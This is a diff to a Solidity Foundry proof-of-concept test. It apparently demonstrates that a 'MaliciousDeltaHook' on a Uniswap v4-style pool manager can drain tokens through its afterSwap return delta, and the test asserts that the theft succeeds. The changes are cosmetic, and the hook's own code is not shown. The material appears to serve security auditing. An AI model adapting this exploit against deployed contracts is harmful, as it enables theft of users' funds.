@@ -19,7 +19,7 @@ contract POC is Test {
         uint160 flags=uint160(Hooks.AFTER_SWAP_FLAG|Hooks.AFTER_SWAP_RETURNS_DELTA_FLAG);
         address a=address(uint160(0x1000000000000000000000000000000000000000)|flags);
         vm.etch(a, address(new MaliciousDeltaHook(manager)).code); hook=MaliciousDeltaHook(a);
-        vm.store(address(hook), bytes32(0), bytes32(uint256(uint160(address(manager)))));
+        vm.store(address(hook), bytes32(uint256(0)), bytes32(uint256(uint160(address(manager)))));
         token0.mint(address(this),10000e18); token1.mint(address(this),10000e18);
         token0.mint(address(manager),10000e18); token1.mint(address(manager),10000e18);
         key=PoolKey(Currency.wrap(address(token0)), Currency.wrap(address(token1)),3000,60,IHooks(address(hook)));
@@ -42,5 +42,9 @@ contract POC is Test {
         }
         return "";
     }
-    function test_afterSwapReturnDelta() public { uint b0 = token0.balanceOf(address(this)); manager.unlock(abi.encode(uint256(2))); assertGt(token0.balanceOf(address(this)), b0); }
+    function test_afterSwapReturnDelta() public {
+        uint b0 = token0.balanceOf(address(this));
+        manager.unlock(abi.encode(uint256(2)));
+        assertGt(token0.balanceOf(address(this)), b0, "steal failed");
+    }
 }
